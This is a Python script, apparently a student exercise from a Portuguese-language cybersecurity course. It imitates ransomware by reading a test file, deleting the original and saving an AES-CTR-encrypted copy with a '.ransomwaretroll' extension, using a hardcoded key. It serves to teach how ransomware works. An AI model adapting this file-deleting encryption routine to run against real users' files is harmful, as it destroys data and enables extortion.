import os
import pyaes

# ============================================================
# ENCRIPTADOR DIDÁTICO — DESAFIO DIO RANSOMWARE PYTHON
# Instructor: Cassiano Peres | Curso: Cibersegurança
# ============================================================
# Fluxo:
#   1. Abre o arquivo alvo em modo binário de leitura (rb)
#   2. Lê todo o conteúdo para memória
#   3. Remove o arquivo original do disco
#   4. Criptografa os dados com AES-CTR (chave 16 bytes)
#   5. Salva o resultado com extensão .ransomwaretroll
# ============================================================

# Nome do arquivo a ser criptografado
file_name = "teste.txt"

try:
    # ETAPA 1: Abrir arquivo em modo binário de leitura (rb)
    # 'rb' = read binary — preserva bytes exatos, sem decodificação de texto
    file = open(file_name, "rb")
    file_data = file.read()
    file.close()
    print(f"[+] Arquivo '{file_name}' lido com sucesso ({len(file_data)} bytes)")

except FileNotFoundError:
    # Tratamento explícito: arquivo não existe no caminho informado
    print(f"[ERRO] Arquivo '{file_name}' não encontrado. Verifique o nome e o caminho.")
    exit(1)

# ETAPA 2: Remover o arquivo original do disco
# Após a leitura, o original é apagado para simular comportamento de ransomware
os.remove(file_name)
print(f"[+] Arquivo original '{file_name}' removido")

# ETAPA 3: Definir chave de criptografia (16 bytes = 128 bits)
# AES-CTR no pyaes exige chave de 16, 24 ou 32 bytes (AES-128, AES-192, AES-256)
# 'testeransomwares' tem exatamente 16 caracteres → 16 bytes → AES-128
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# ETAPA 4: Criptografar os dados lidos
# CTR (Counter Mode) transforma o AES em stream cipher — não requer padding
crypto_data = aes.encrypt(file_data)
print(f"[+] Dados criptografados ({len(crypto_data)} bytes)")

# ETAPA 5: Salvar arquivo criptografado com nova extensão
# Extensão .ransomwaretroll identifica arquivos "sequestrados"
new_file_name = file_name + ".ransomwaretroll"
new_file = open(new_file_name, 'wb')  # 'wb' = write binary
new_file.write(crypto_data)
new_file.close()
print(f"[+] Arquivo criptografado salvo como '{new_file_name}'")
print("[✓] Criptografia concluída com sucesso")